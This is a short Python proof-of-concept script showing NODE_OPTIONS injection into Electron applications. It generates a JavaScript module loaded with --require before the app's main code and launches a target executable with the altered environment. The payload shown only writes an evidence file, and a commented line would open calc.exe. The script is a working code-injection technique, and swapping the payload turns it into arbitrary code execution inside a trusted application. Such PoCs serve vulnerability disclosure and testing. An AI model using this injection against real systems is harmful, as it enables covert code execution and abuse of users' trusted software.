#!/usr/bin/env python3
"""
NODE_OPTIONS injection PoC in Electron applications.
Demonstrates code execution via environment variable.

Only works if the EnableNodeOptionsEnvironmentVariable
fuse is enabled (Electron Fuse 3).
"""
import os
import subprocess
from pathlib import Path

def create_payload_module(output_path: str):
    """Creates a JavaScript module that will be loaded via NODE_OPTIONS."""
    payload = """
// Module loaded via NODE_OPTIONS --require
// Runs before the application's main.js
const { execSync } = require('child_process');
const fs = require('fs');

// PoC: write evidence
fs.writeFileSync(
    'C:\\\\temp\\\\node_options_poc.txt',
    `NODE_OPTIONS injection successful\\n` +
    `PID: ${process.pid}\\n` +
    `Executable: ${process.execPath}\\n` +
    `Time: ${new Date().toISOString()}\\n`
);

// Alternative PoC: open calc.exe
// execSync('calc.exe');
"""
    Path(output_path).write_text(payload)
    return output_path


def inject_via_node_options(target_exe: str, payload_path: str):
    """Executes the Electron application with NODE_OPTIONS injected."""
    env = os.environ.copy()
    env["NODE_OPTIONS"] = f"--require={payload_path}"

    # Start the application with the modified environment variable
    proc = subprocess.Popen(
        [target_exe],
        env=env,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
    )
    return proc.pid
